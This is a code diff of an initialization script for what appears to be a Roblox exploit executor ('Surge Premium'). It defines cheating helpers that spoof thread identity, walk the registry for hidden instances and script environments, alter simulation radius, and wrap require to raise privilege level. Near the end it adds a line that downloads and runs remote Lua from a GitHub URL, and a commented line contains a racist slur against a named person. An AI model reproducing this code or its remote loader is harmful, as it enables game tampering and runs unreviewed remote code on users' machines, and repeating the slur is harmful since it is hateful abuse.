@@ -1,4 +1,4 @@
-if not game:IsLoaded() then game.Loaded:Wait() end
+--if not game:IsLoaded() then game.Loaded:Wait() end
 
 getgenv().consoleclear = function() end
 getgenv().consolecreate = function() end
@@ -10,62 +10,78 @@ getgenv().rconsolename = function() end
 
 local testdebug = table.clone(debug)
 
--- Assign debug functions
-local debugFunctions = {
-    "getconstant", "getconstants", "getinfo", "setconstant",
-    "getproto", "getprotos", "getstack", "setstack",
-    "getupvalue", "getupvalues", "setupvalue", "getregistry"
-}
-
-for _, func in ipairs(debugFunctions) do
-    testdebug[func] = getgenv()[func]
-end
+testdebug.getconstant = getgenv().getconstant
+testdebug.getconstants = getgenv().getconstants
+testdebug.getinfo = getgenv().getinfo
+testdebug.setconstant = getgenv().setconstant
+testdebug.getproto = getgenv().getproto
+testdebug.getprotos = getgenv().getprotos
+testdebug.getstack = getgenv().getstack
+testdebug.setstack = getgenv().setstack
+testdebug.getupvalue = getgenv().getupvalue
+testdebug.getupvalues = getgenv().getupvalues
+testdebug.setupvalue = getgenv().setupvalue
+testdebug.getregistry = getgenv().getregistry
 
 debug = testdebug
 
--- Bitwise operations
 getgenv().bit = {}
+
 for i, v in next, bit32 do
-    getgenv().bit[i] = v
+bit[i] = v
 end
 
--- Define bitwise functions
-getgenv().bit.badd = function(a, b) return a + b end
-getgenv().bit.bsub = function(a, b) return a - b end
-getgenv().bit.bdiv = function(a, b) return a / b end
-getgenv().bit.bmul = function(a, b) return a * b end
+bit.ror = bit.rrotate
+bit.rol = bit.lrotate
+bit.rrotate = nil
+bit.lrotate = nil
 
-getgenv().bit.tobit = function(x)
-    x = x % (2^32)
-    if x >= 0x80000000 then x = x - (2^32) end
-    return x
+bit.badd = function(a, b)
+   return a + b
 end
 
-getgenv().bit.tohex = function(x, n)
-    n = n or 8
-    local up
-    if n <= 0 then
-        if n == 0 then return '' end
-        up = true
-        n = -n
-    end
-    x = bit.band(x, 16^n-1)
-    return ('%0'..n..(up and 'X' or 'x')):format(x)
+bit.bsub = function(a, b)
+   return a - b
 end
 
-getgenv().bit.bswap = function(x)
-    local a = bit.band(x, 0xff)
-    x = bit.rshift(x, 8)
-    local b = bit.band(x, 0xff)
-    x = bit.rshift(x, 8)
-    local c = bit.band(x, 0xff)
-    x = bit.rshift(x, 8)
-    local d = bit.band(x, 0xff)
-    return bit.lshift(bit.lshift(bit.lshift(a, 8) + b, 8) + c, 8) + d
+bit.bdiv = function(a, b)
+   return a / b
 end
 
--- Thread identity functions
-getgenv().setthreadidentity = function(identity)
+bit.bmul = function(a, b)
+   return a * b
+end
+
+bit.tobit = function(x)
+  x = x % (2^32)
+  if x >= 0x80000000 then x = x - (2^32) end
+  return x
+end
+
+bit.tohex = function(x, n)
+ n = n or 8
+ local up
+ if n <= 0 then
+   if n == 0 then return '' end
+   up = true
+   n = - n
+ end
+ x = bit.band(x, 16^n-1)
+ return ('%0'..n..(up and 'X' or 'x')):format(x)
+end
+
+bit.bswap = function(x)
+ local a = bit.band(x, 0xff)
+ x = bit.rshift(x, 8)
+ local b = bit.band(x, 0xff)
+ x = bit.rshift(x, 8)
+ local c = bit.band(x, 0xff)
+ x = bit.rshift(x, 8)
+ local d = bit.band(x, 0xff)
+ return bit.lshift(bit.lshift(bit.lshift(a, 8) + b, 8) + c, 8) + d
+end
+
+getgenv().setthreadidentity = function(identity: number): ()
     _setidentity(identity)
     task.wait()
 end
@@ -73,22 +89,21 @@ end
 getgenv().setidentity = getgenv().setthreadidentity
 getgenv().setthreadcontext = getgenv().setthreadidentity
 
--- Get instances function
 getgenv().getinstances = function()
-    local objs = {}
-    for i, v in next, getreg() do
-        if type(v) == 'table' then
-            for o, b in next, v do
-                if typeof(b) == "Instance" then
-                    table.insert(objs, b)
-                end
+            local objs = {}
+            for i,v in next, getreg() do
+               if type(v)=='table' then
+                  for o,b in next, v do
+                      if typeof(b) == "Instance" then
+                           table.insert(objs, b)
+                      end
+                  end
+               end
             end
-        end
-    end
-    return objs
-end
+         return objs
+ end
 
--- CoreGui communication channels
+
 do
     local CoreGui = game:GetService('CoreGui')
     local HttpService = game:GetService('HttpService')
@@ -97,7 +112,6 @@ do
     if comm_channels.Name ~= 'comm_channels' then
         comm_channels.Name = 'comm_channels'
     end
-
     getgenv().create_comm_channel = newcclosure(function() 
         local id = HttpService:GenerateGUID()
         local event = Instance.new('BindableEvent', comm_channels)
@@ -111,10 +125,251 @@ do
     end)
 end
 
--- Additional functions omitted for brevity...
+getgenv().getactors = newcclosure(function()
+    local actors = {};
+    for i, v in game:GetDescendants() do
+        if v:IsA("Actor") then
+            table.insert(actors, v);
+        end
+    end
+    return actors;
+end);
 
--- Notification example
-game:GetService("StarterGui"):SetCore("SendNotification", {
+getgenv().getnilinstances = function()
+    local objs = {}
+	for i,v in next,getreg() do
+		if type(v)=="table" then
+			for o,b in next,v do
+				if typeof(b) == "Instance" and b.Parent==nil then
+					table.insert(objs, b)
+				end
+			end
+		end
+	end
+	return objs
+end
+
+getgenv().getscripthash = function(script)
+    return script:GetHash()
+end
+
+setreadonly(getgenv().debug,false)
+getgenv().debug.traceback = getrenv().debug.traceback
+getgenv().debug.profilebegin = getrenv().debug.profilebegin
+getgenv().debug.profileend = getrenv().debug.profileend
+getgenv().debug.getmetatable = getgenv().getrawmetatable
+getgenv().debug.setmetatable = getgenv().setrawmetatable
+getgenv().debug.info = getrenv().debug.info
+
+getgenv().getrunningscripts = function()
+    local t = table.create(0)
+
+    for i,v in pairs(getreg()) do
+        if typeof(v) == "thread" then
+            local a = gettenv(v)
+
+            if a["script"] then
+                if not table.find(t,a.script) then
+                    table.insert(t, a.script)
+                end
+            end
+        end
+    end
+
+return t
+
+end
+
+getgenv().getloadedmodules = function()
+    local list = {}
+    for i, v in getgc(false) do
+        if typeof(v) == "function" then
+            local success, env = pcall(getfenv, v)
+            if success and typeof(env) == "table" and typeof(env["script"]) == "Instance" and env["script"]:IsA("ModuleScript") then
+                if not table.find(list, env["script"]) then
+                    table.insert(list, env["script"])
+                end
+            end
+        end
+    end
+    return list
+end
+
+getgenv().getsenv = function(script_instance)
+   for i, v in pairs(getreg()) do
+      if type(v) == "function" then
+         if getfenv(v).script == script_instance then
+             return getfenv(v)
+             end
+          end
+     end
+end
+
+getgenv().isnetworkowner = function(part: BasePart): boolean
+    return part.ReceiveAge == 0 and not part.Anchored and part.Velocity.Magnitude > 0
+end
+
+getgenv().firesignal = function(signal, ...)
+    local connections = firesignalconnections(signal)
+    for _, connection in connections do
+        connection.Function(...)
+    end
+end
+
+--[[
+local real_setscriptable = clonefunction(setscriptable)
+local real_isscriptable = clonefunction(isscriptable)
+
+local scriptabled = {}
+local scriptabledProperties = {}
+
+local notvalid = '%s is not a valid member of %s "%s"' 
+
+getgenv().isscriptable = function(self, i)
+    assert(typeof(self) == 'Instance', 'Instance expected as argument #1')
+    assert(typeof(i) == 'string', 'string expected as argument #2')
+    
+    if not scriptabledProperties[i] then
+        return real_isscriptable(self, i)
+    else
+        return scriptabled[self] ~= nil and scriptabled[self][i] == true
+    end
+end
+
+getgenv().setscriptable = function(self, i, v)
+    assert(typeof(self) == 'Instance', 'Instance expected as argument #1')
+    assert(typeof(i) == 'string', 'string expected as argument #2')
+    assert(typeof(v) == 'boolean', 'boolean expected as argument #3')
+    
+    local wasScriptable = isscriptable(self, i)
+
+    if v == false then
+        if scriptabled[self] then
+            scriptabled[self][i] = nil
+        end
+    elseif v == true then
+        if not scriptabled[self] then
+            scriptabled[self] = {}
+        end
+        scriptabled[self][i] = true
+        real_setscriptable(self, i, true)
+        scriptabledProperties[i] = true
+    end
+
+    return wasScriptable
+end
+]]--
+
+getgenv().setsimulationradius = function(newRadius)
+    assert(newRadius, `arg #1 is missing`)
+    assert(type(newRadius) == "number", `arg #1 must be type number`)
+
+    local LocalPlayer = game:GetService("Players").LocalPlayer
+    if LocalPlayer then
+        LocalPlayer.SimulationRadius = newRadius
+        LocalPlayer.MaximumSimulationRadius = newRadius
+    end
+end
+
+getgenv().getsimulationradius = function()
+    assert(newRadius, `arg #1 is missing`)
+    assert(type(newRadius) == "number", `arg #1 must be type number`)
+
+    local LocalPlayer = game:GetService("Players").LocalPlayer
+    if LocalPlayer then
+        return LocalPlayer.SimulationRadius
+    end
+end
+
+getgenv().http = {}
+getgenv().http.request = request
+setreadonly(http, true)
+
+getgenv().http_request = request
+
+getgenv().base64 = {}
+getgenv().crypt = {}
+getgenv().crypt.base64 = {}
+
+getgenv().crypt.base64encode = getgenv().base64encode
+getgenv().crypt.base64.encode = getgenv().base64encode
+getgenv().crypt.base64_encode = getgenv().base64encode
+getgenv().base64.encode = getgenv().base64encode
+getgenv().base64_encode = getgenv().base64encode
+
+getgenv().crypt.base64decode = getgenv().base64decode
+getgenv().crypt.base64.decode = getgenv().base64decode
+getgenv().crypt.base64_decode = getgenv().base64decode
+getgenv().base64.decode = getgenv().base64decode
+getgenv().base64_decode = getgenv().base64decode
+
+getgenv().crypt.encrypt = getgenv().encrypt
+getgenv().crypt.decrypt = getgenv().decrypt
+
+getgenv().crypt.generatebytes = getgenv().generatebytes
+
+getgenv().crypt.generatekey = getgenv().generatekey
+getgenv().crypt.hash = getgenv().hash
+
+setreadonly(getgenv().base64, true)
+setreadonly(getgenv().crypt, true)
+
+local _oldd = clonefunction(getscriptclosure_handler)
+
+getgenv().getscriptclosure = newcclosure(function(scr) 
+	local closure = _oldd(scr)
+
+	if typeof(closure) == "function" then
+		local scriptEnv = getfenv(closure)
+
+		scriptEnv["script"] = scr
+
+		return closure
+	else
+		return nil
+	end
+end)
+
+getgenv().getscriptfunction = getgenv().getscriptclosure
+
+local oldreq = clonefunction(getrenv().require)
+getgenv().require = newcclosure(function(v)
+    local oldlevel = getthreadcontext()
+    local succ, res = pcall(oldreq, v)
+    if not succ and res:find('RobloxScript') then
+        succ = nil
+        coroutine.resume(coroutine.create(newcclosure(function()
+            setthreadcontext((oldlevel > 5 and 2) or 8)
+            succ, res = pcall(oldreq, v)
+        end)))
+        repeat task.wait() until succ ~= nil
+    end
+    
+    setthreadcontext(oldlevel)
+    
+    if succ then
+        return res
+    end
+end)
+--[[
+getgenv().decompile = function(script)
+	httpresponse = request({
+		Url = "https://127.0.0.1:9002",
+		Body = base64.encode(getscriptbytecode(script)),
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "text/plain"
+		},
+	})
+	return httpresponse.Body
+end]]
+
+--loadstring(game:HttpGet('https://pastebin.com/raw/5LGTLMg3'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PSWalloz/23ergtfb/refs/heads/main/DDD.lua"))()
+
+--warn("PSWalloz is a slave ass nigger")
+
+game:GetService("StarterGui"):SetCore("SendNotification",{
     Title = "[Surge]",
     Icon = "rbxassetid://101069853971193",
     Text = "Surge Premium Attached!",
